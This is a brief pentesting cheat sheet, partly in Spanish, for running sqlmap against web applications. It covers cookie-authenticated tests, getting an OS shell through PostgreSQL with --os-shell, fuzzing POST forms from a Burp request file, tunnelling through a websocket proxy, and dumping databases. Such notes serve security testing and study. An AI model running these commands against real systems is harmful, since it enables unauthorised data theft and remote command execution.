## Documentation
https://book.hacktricks.xyz/pentesting-web/sql-injection/sqlmap

## Test sqlmap with cookies
sqlmap -u 'http://[IP]/dashboard.php?search=a' --cookie="PHPSESSID=73jv7pdmjsv7dsspoqtnlv66ls"

## Ingect shell in postgresql
sqlmap -u 'http://[IP]/dashboard.php?search=a' --cookie="PHPSESSID=73jv7pdmjsv7dsspoqtnlv66ls" --os-shell

## Test HTTP POST Form
	- Use burrp to get the full request and save it into a [post_request].txt file	
		> Use 'Copy to file' save as request.txt
	- sqlmap -r [post_request].txt -p [param_to_fuzz]
	- '-r' is the specific file with the full http post form request
	- '-p' is the param in the form request to fuzz, It is usually user or password.
	- Tambien se puede ejecutar a pelo la peticion y que identifique solo los parametros inllectables:
		- sqlmap -r [post_request].txt

## SQLI a Web Socket
	
	# Documentation
	https://rayhan0x01.github.io/ctf/2021/04/02/blind-sqli-over-websocket-automation.html

	## How to
	1 - Use python script as proxy
	2 - Send SQLmap againts the proxy to reach the websocket

## Dump database
	* --dbms=[database] --dump

## Test sqli in body param
sqlmap -u "https://miweb.com/api/endpoint" --data="param1=valor1&param2=valor2" --risk=3 --level=5

## Otras opciones útiles:
--dump: Extrae datos de la base de datos.
--current-db: Muestra la base de datos actual.
--current-user: Muestra el usuario actual de la base de datos.
--banner: Muestra la versión del servidor de base de datos.
--threads=10: Aumenta el número de hilos para acelerar las pruebas.
